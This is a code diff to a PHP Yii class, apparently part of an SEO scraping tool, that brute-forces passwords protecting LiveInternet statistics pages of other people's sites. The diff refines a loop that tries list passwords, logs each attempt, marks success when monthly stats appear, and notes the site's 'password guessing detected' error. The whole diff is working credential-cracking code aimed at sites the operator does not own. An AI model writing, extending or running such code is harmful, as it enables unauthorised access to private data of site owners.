@@ -17,9 +17,6 @@ class LiPassword extends LiBaseParser
             $this->getSite();
             $this->log('Start cracking site ' . $this->site->id . ' ' . $this->site->url);
             $this->crackPassword();
-
-            $this->site->active = 2;
-            $this->site->save();
         }
         //mail('alexk984@gmail.com', 'report parsing site '.$this->site->url, $found.' keywords parsed');
     }
@@ -29,7 +26,7 @@ class LiPassword extends LiBaseParser
         $transaction = Yii::app()->db_seo->beginTransaction();
         try {
             $criteria = new CDbCriteria;
-            $criteria->condition = 'public=0 AND active=0';
+            $criteria->condition = 'public=0 AND active=0 AND PASSWORD IS NULL';
             $this->site = LiSite::model()->find($criteria);
             $this->site->active = 1;
             $this->site->save();
@@ -45,10 +42,20 @@ class LiPassword extends LiBaseParser
 
     public function crackPassword()
     {
-        foreach ($this->passwords as $password){
+        while (true){
+            $password = LiSitePasswords::getPassword($this->site, $this->passwords);
+
+            if ($password === true){
+                $this->site->active = 2;
+                $this->site->save();
+                $this->log('site cracking finished');
+                break;
+            }
+
             $result = $this->checkPassword($password);
-            if ($result){
+            if ($result === true){
                 $this->site->password = $password;
+                $this->site->active = 0;
                 $this->site->save();
                 $this->log('PASSWORD SUCCESS: '.$password);
                 break;
@@ -74,9 +81,11 @@ class LiPassword extends LiBaseParser
 
         if (strpos($html, 'Ошибка: неверный пароль')) {
             $this->log('password denied');
+            LiSitePasswords::addPassword($this->site, $password);
             return false;
         }
         if (strpos($html, 'по месяцам')) {
+            LiSitePasswords::addPassword($this->site, $password);
             return true;
         }
         if (strpos($html, 'Ошибка: зафиксирована попытка подбора пароля')) {
